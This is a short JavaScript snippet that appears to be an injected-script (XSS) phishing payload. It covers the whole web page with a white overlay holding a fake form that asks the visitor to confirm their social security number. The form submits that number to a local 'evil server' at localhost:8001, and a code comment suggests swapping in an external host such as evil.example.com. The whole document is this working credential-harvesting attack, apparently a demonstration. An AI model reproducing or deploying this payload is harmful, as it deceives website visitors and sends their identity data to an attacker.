var container = document.createElement('div'); 
container.style = 'position: absolute; top: 0; background-color: white; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;'; 

var form = document.createElement('form');
form.method = 'GET';
// Local "evil server", could easily be "http://evil.example.com"
form.action = 'http://localhost:8001';
form.style = 'width: 50%; display: flex; flex-direction: column;';

var input = document.createElement('input');
input.type = 'text';
input.name = 'ssn'
input.style = 'width: 100%;';

var label = document.createElement('label');
label.innerHTML = 'Please confirm your social security number (XXX-XX-XXXX)';
label.appendChild(input);
form.appendChild(label);

var submit = document.createElement('button');
submit.type = 'submit';
submit.innerHTML = 'Submit';
form.appendChild(submit);

container.appendChild(form);
document.documentElement.appendChild(container);
